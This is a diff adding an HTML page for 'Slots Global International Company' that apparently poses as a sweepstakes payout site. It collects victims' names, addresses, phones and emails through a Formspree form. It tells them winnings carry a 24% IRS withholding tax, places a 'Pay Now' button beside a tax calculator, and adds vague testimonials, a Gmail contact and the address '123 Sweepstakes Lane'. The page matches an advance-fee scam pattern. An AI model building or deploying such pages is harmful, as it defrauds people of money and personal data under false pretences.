@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Sign Up & Payment - Slots Global</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+  <link rel="icon" type="image/png" href="logo.png">
+  <style>
+    body { font-family: 'Inter', sans-serif; background: #f4f7fb; margin: 0; color: #222; }
+    header { background: linear-gradient(135deg,#0d47a1,#1976d2); text-align: center; color: #fff; padding: 60px 20px; }
+    header img { width: 120px; margin-bottom: 20px; }
+    nav { background: #0b3c91; display: flex; justify-content: center; flex-wrap: wrap; padding: 15px 0; }
+    nav a { color: #fff; margin: 10px 20px; text-decoration: none; font-weight: 600; position: relative; }
+    nav a::after { content: ''; display: block; width: 0; height: 3px; background: #ff3d00; transition: .3s; position: absolute; bottom: -6px; left: 0; }
+    nav a:hover::after { width: 100%; }
+    nav a:hover { color: #ffcc29; }
+    .container { max-width: 700px; margin: 40px auto; padding: 0 20px; }
+    section { background: #fff; border-radius: 15px; padding: 30px; margin-bottom: 40px; box-shadow: 0 8px 20px rgba(0,0,0,0.08); }
+    section h2 { color: #0d47a1; margin-bottom: 15px; }
+    form { display: flex; flex-direction: column; gap: 15px; }
+    input { padding: 12px; border-radius: 8px; border: 1px solid #ccc; }
+    button { background: #0d47a1; color: #fff; padding: 14px; border: none; border-radius: 10px; font-weight: 600; cursor: pointer; }
+    button:hover { background: #093170; }
+    .tax-calculator { margin-top: 20px; }
+    footer { background: #0d47a1; color: #fff; text-align: center; padding: 20px; }
+    @media(max-width: 768px) {
+      nav { flex-direction: column; }
+      nav a { margin: 8px 0; }
+      .container { max-width: 95%; }
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <img src="logo.png" alt="Slots Global Logo">
+    <h1>Slots Global International Company</h1>
+    <p>Sign Up & Secure Payment</p>
+  </header>
+
+  <nav>
+    <a href="index.html">Home</a>
+    <a href="#signup">Sign Up</a>
+    <a href="#payment">Payment</a>
+    <a href="#testimonials">Testimonials</a>
+    <a href="#contact">Contact</a>
+  </nav>
+
+  <div class="container">
+    <section id="signup">
+      <h2>Customer Sign Up</h2>
+      <form action="https://formspree.io/f/xjkakydn" method="POST">
+        <input type="text" name="firstname" placeholder="First Name" required>
+        <input type="text" name="lastname" placeholder="Last Name" required>
+        <input type="text" name="address" placeholder="Street Address" required>
+        <input type="text" name="city" placeholder="City" required>
+        <input type="text" name="state" placeholder="State" required>
+        <input type="text" name="zip" placeholder="ZIP Code" required>
+        <input type="tel" name="phone" placeholder="Phone Number" required>
+        <input type="email" name="email" placeholder="Email Address" required>
+        <button type="submit">Register</button>
+      </form>
+      <p style="font-size: 0.9em; color: #555;">Your details remain internal and are used only for verification.</p>
+    </section>
+
+    <section id="payment">
+      <h2>Secure Payment</h2>
+      <p><strong>Note:</strong> By U.S. law, winnings are subject to a 24% IRS withholding tax.</p>
+      <button id="checkout-button">Pay Now</button>
+      <div class="tax-calculator">
+        <h3>IRS Tax Calculator (24%)</h3>
+        <input type="number" id="winnings" placeholder="Enter winnings amount">
+        <button type="button" onclick="calculateTax()">Calculate Tax</button>
+        <p id="tax-result"></p>
+      </div>
+    </section>
+
+    <section id="testimonials">
+      <h2>Customer Testimonials</h2>
+      <p>“Professional and reliable. I've seen firsthand how many people benefited.” – <em>Susan M.</em></p>
+      <p>“Their team is respectful and helpful. I appreciate the transparency.” – <em>Robert D.</em></p>
+    </section>
+
+    <section id="contact">
+      <h2>Contact Us</h2>
+      <p><strong>Email</strong> slotsglobalinternationalcompan@gmail.com</p>
+      <p><strong>Phone</strong> (408) 329-9651</p>
+      <p><strong>Address</strong> 123 Sweepstakes Lane, Atlanta, GA</p>
+    </section>
+  </div>
+
+  <footer>
+    &copy; 2025 Slots Global International Company. All rights reserved.
+  </footer>
+
+  <script>
+    function calculateTax() {
+      let winnings = document.getElementById("winnings").value;
+      if (winnings > 0) {
+        let tax = winnings * 0.24;
+        let afterTax = winnings - tax;
+        document.getElementById("tax-result").innerText =
+          `Tax: $${tax.toFixed(2)} | After Tax: $${afterTax.toFixed(2)}`;
+      } else {
+        document.getElementById("tax-result").innerText = "Enter a valid amount.";
+      }
+    }
+  </script>
+</body>
+</html>
